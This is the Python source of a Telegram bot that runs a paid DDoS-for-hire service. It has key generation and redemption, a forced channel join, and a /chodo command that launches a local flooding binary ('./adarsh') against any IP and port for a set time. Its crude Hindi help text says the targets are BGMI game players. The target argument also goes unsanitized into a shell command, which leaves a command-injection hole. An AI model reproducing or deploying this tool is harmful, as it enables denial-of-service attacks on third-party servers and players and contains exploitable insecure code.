import telebot
import subprocess
import threading
import os
import signal
import copy
from datetime import datetime, timedelta
from pymongo import MongoClient

from keep_alive import keep_alive
keep_alive()

# ============================================================
# BOT OWNER ID (CHANGE PLEASE)
# ============================================================
BOT_OWNER = 123456789   # <-- Yaha apna Telegram numeric ID daalna

# ============================================================
# BOT TOKEN
# ============================================================
BOT_TOKEN = "YOUR_BOT_TOKEN"
bot = telebot.TeleBot(BOT_TOKEN)

# ============================================================
# GROUPS
# ============================================================
ALLOWED_GROUPS = {"-1002382674139"}

REQUIRED_CHANNELS = ["@BADMOSH10"]

# ============================================================
# MONGO DATABASE
# ============================================================
mongo = MongoClient("YOUR_MONGO_URI")
db = mongo["bot"]
keys_col = db["keys"]

# ============================================================
# TEMP MEMORY
# ============================================================
feedback_pending = {}
attack_processes = {}
attack_owners = {}
attack_running = False

# GLOBAL MAX ATTACK TIME (OWNER CHANGEABLE)
MAX_ATTACK = 120


# ============================================================
# CHECK CHANNEL MEMBERSHIP
# ============================================================
def is_member(user_id):
    for channel in REQUIRED_CHANNELS:
        try:
            status = bot.get_chat_member(channel, user_id)
            if status.status not in ["member", "administrator", "creator"]:
                return False
        except:
            return False
    return True


# ============================================================
# KEY VALIDATION
# ============================================================
def key_valid(uid):
    data = keys_col.find_one({"used_by": uid})
    if not data:
        return False
    if data["expire"] < datetime.utcnow():
        return False
    return True


# ============================================================
# TIME FORMAT
# ============================================================
def time_left(expire):
    left = expire - datetime.utcnow()
    sec = int(left.total_seconds())

    if sec <= 0:
        return "Expired"

    d = sec // 86400
    h = (sec % 86400) // 3600
    m = (sec % 3600) // 60
    s = sec % 60

    if d > 0:
        return f"{d} Days {h} Hours"
    if h > 0:
        return f"{h} Hours {m} Min"
    if m > 0:
        return f"{m} Min {s} Sec"

    return f"{s} Sec"


# ============================================================
# OWNER: GENERATE KEYS
# ============================================================
@bot.message_handler(commands=["gen"])
def generate_keys(message):
    if message.from_user.id != BOT_OWNER:
        return bot.reply_to(message, "⛔ Owner only!")

    p = message.text.split()
    if len(p) != 4:
        return bot.reply_to(message, "Usage: /gen <m|h|d> <time> <count>")

    unit = p[1]
    amount = int(p[2])
    count = int(p[3])

    if unit == "m":
        delta = timedelta(minutes=amount)
    elif unit == "h":
        delta = timedelta(hours=amount)
    elif unit == "d":
        delta = timedelta(days=amount)
    else:
        return bot.reply_to(message, "❌ Wrong unit! Use m/h/d")

    output = "🔥 Generated Keys 🔥\n\n"

    for _ in range(count):
        key = os.urandom(6).hex()
        expire = datetime.utcnow() + delta

        keys_col.insert_one({
            "key": key,
            "expire": expire,
            "used_by": None
        })

        output += f"{key}\n"

    bot.send_message(message.chat.id, output)


# ============================================================
# USER: REDEEM KEY
# ============================================================
@bot.message_handler(commands=["redeem"])
def redeem_key(message):
    key = message.text.replace("/redeem", "").strip()

    if key == "":
        return bot.reply_to(message, "❌ Key missing!")

    data = keys_col.find_one({"key": key})
    if not data:
        return bot.reply_to(message, "❌ Invalid key!")

    if data["used_by"]:
        return bot.reply_to(message, "❌ Already used!")

    keys_col.update_one(
        {"key": key},
        {"$set": {"used_by": message.from_user.id}}
    )

    bot.reply_to(message, "✅ Key activated! Enjoy.")


# ============================================================
# OWNER: SET MAX ATTACK
# ============================================================
@bot.message_handler(commands=["set_attack"])
def set_attack_time(message):
    global MAX_ATTACK

    if message.from_user.id != BOT_OWNER:
        return bot.reply_to(message, "⛔ Owner only!")

    try:
        val = int(message.text.split()[1])
        MAX_ATTACK = val
        bot.reply_to(message, f"✅ Max attack updated: {MAX_ATTACK}s")
    except:
        bot.reply_to(message, "Usage: /set_attack <seconds>")


# ============================================================
# ATTACK SYSTEM
# ============================================================
def start_attack(target, port, duration, message):
    global attack_running

    try:
        uid = message.from_user.id
        chat_id = str(message.chat.id)

        feedback_pending[uid] = True

        bot.reply_to(
            message,
            f"✅ Chudai started on \n{target}:{port} for {duration}s.\nSend Feedback.\n/ruko to stop."
        )

        command = f"{os.path.abspath('./adarsh')} {target} {port} {duration} 900"
        process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)

        attack_processes[chat_id] = process
        attack_owners[chat_id] = uid
        attack_running = True

        process.wait()

        bot.reply_to(message, f"✅ Chudai completed on.")

        attack_processes.pop(chat_id, None)
        attack_owners.pop(chat_id, None)
        attack_running = False

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")
        attack_running = False


# ============================================================
# /CHODO COMMAND
# ============================================================
@bot.message_handler(commands=["chodo"])
def handle_attack(message):
    global attack_running

    uid = message.from_user.id
    cid = str(message.chat.id)

    if cid not in ALLOWED_GROUPS:
        return bot.reply_to(message, "❌ Use in allowed group only.")

    if not is_member(uid):
        return bot.reply_to(message, "❌ Join @BADMOSH10 first.")

    if not key_valid(uid):
        return bot.reply_to(
            message,
            "⛔ Permission Denied!\nYour key expired.\nBuy → @BADMOSH_X_GYRANGE"
        )

    if feedback_pending.get(uid, False):
        return bot.reply_to(message, "❌ Send feedback first!")

    if attack_running:
        return bot.reply_to(message, "❌ Attack already running!")

    p = message.text.split()
    if len(p) != 4:
        return bot.reply_to(message, "Usage: /chodo <target> <port> <time>")

    target, port, duration = p[1], p[2], p[3]

    try:
        port = int(port)
        duration = int(duration)

        if duration > MAX_ATTACK:
            return bot.reply_to(
                message,
                f"❌ Max attack allowed: {MAX_ATTACK}s"
            )

        msg_copy = copy.deepcopy(message)
        thread = threading.Thread(
            target=start_attack,
            args=(target, port, duration, msg_copy)
        )
        thread.start()

    except:
        bot.reply_to(message, "❌ Port & time must be numbers!")


# ============================================================
# STOP ATTACK
# ============================================================
@bot.message_handler(commands=["ruko"])
def stop_attack(message):
    global attack_running

    cid = str(message.chat.id)

    if cid not in attack_processes:
        return bot.reply_to(message, "❌ No active attack!")

    process = attack_processes[cid]

    try:
        os.killpg(os.getpgid(process.pid), signal.SIGINT)
        bot.reply_to(message, "🛑 Attack stopped!")

        attack_processes.pop(cid, None)
        attack_owners.pop(cid, None)
        attack_running = False

    except Exception as e:
        bot.reply_to(message, f"❌ Error stopping: {e}")


# ============================================================
# PHOTO FEEDBACK
# ============================================================
@bot.message_handler(content_types=["photo"])
def photo_feedback(message):
    uid = message.from_user.id

    if feedback_pending.get(uid, False):
        feedback_pending[uid] = False
        bot.reply_to(message, "✅ Feedback received. You may attack again.")


# ============================================================
# HELP COMMAND
# ============================================================
@bot.message_handler(commands=['help'])
def help_cmd(message):
    bot.reply_to(message, """
💥 /chodo : 😫 BGMI WALO KI MAA KO CHODO 🥵. 
💥/ruko : CHUDAI rokne ke liye
💥/redeem <key> - Activate key  
Regards :- @BADMOSH_X_GYRANGE  
Official Channel :- https://t.me/BADMOSH10
""")


# ============================================================
# START COMMAND PANEL
# ============================================================
@bot.message_handler(commands=['start'])
def start_cmd(message):
    if message.from_user.id == BOT_OWNER:
        bot.reply_to(message, """
🔥 OWNER PANEL 🔥

Commands:
/gen
/set_attack
/chodo
/ruko
/redeem
/help
""")
    else:
        bot.reply_to(message, """
⚠️ This bot works only in group.

Join: @BADMOSH10  
Buy key → @BADMOSH_X_GYRANGE  
Use command: /chodo (with valid key)
""")


# ============================================================
# START BOT
# ============================================================
try:
    bot.polling(none_stop=True)
except Exception as e:
    print(f"Error: {e}")